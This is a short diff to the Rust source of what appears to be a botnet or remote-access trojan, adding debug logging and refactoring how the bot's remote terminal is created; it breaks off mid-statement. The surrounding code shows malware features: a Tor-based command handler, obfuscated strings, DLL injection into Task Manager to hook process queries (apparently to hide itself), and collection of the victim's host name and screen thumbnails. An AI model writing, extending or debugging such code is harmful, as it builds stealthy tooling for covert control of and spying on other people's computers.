@@ -19,6 +19,8 @@ use shared::{
 };
 use obfstr::obfstr as s;
 use crate::{
+    err,
+    info,
     tasks::task_manager_hook::{ inject_dll, update_query_hooker_list },
     utils::{
         system_info::{ generate_bot_state, get_dynamic_info, get_thumbnail },
@@ -38,16 +40,18 @@ impl BotHandler {
     pub async fn new(logger_config: LoggerCnfg) -> Result<Self> {
         let tor_handler = TrHandler::new(logger_config).await?;
         let bot_state = generate_bot_state().await;
+        info!("bot state gened, pc name: ", bot_state.os_info.host_name);
+        let terminal = match Terminal::new() {
+            Ok(terminal) => { Some(Arc::new(Mutex::new(terminal))) }
+            Err(error) => {
+                err!("error getting terminal: ", error);
+                None
+            }
+        };
         Ok(BotHandler {
             tor_handler,
             bot_state: Arc::new(RwLock::new(bot_state)),
-            terminal: match Terminal::new() {
-                Ok(terminal) => { Some(Arc::new(Mutex::new(terminal))) }
-                Err(_error) => {
-                    // err!("error getting terminal: ", error);
-                    None
-                }
-            },
+            terminal,
         })
     }
 
@@ -63,6 +67,8 @@ impl BotHandler {
         ).await;
     }
     pub fn connect_callback_init(self_ref: Arc<RwLock<Self>>) {
+        info!("connect_callback_init");
+
         let self_guard = self_ref.read().unwrap();
         let params = InitParams { bot_state: self_guard.bot_state.read().unwrap().clone() };
         if
